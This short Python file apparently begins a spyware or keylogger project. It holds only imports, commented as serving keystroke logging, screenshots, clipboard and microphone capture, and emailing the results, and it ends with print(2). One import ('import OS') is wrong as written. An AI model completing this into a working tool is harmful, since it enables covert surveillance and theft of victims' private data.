# Libraries / Dependicies

# Modules to collect Computer Information
import socket
import platform

# Modules to collect screenshots
from multiprocessing import Process, freeze_support
from PIL import ImageGrab

# Modules to collect Clipboard
import win32clipboard

# Modules to collect Key Stroke
from pynput.keyboard import Key, Listener

# Modules for email functionality
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Modules to encrypt files
from cryptography.fernet import Fernet

# Modules to collect time and OS information 
import time 
import OS

# Modules to get username information
import getpass
from requests import get

# Modules to collect audio/ to use Microphone
from scipy.io.wavfile import write
import sounddevice as soundDeviceObject



print(2)
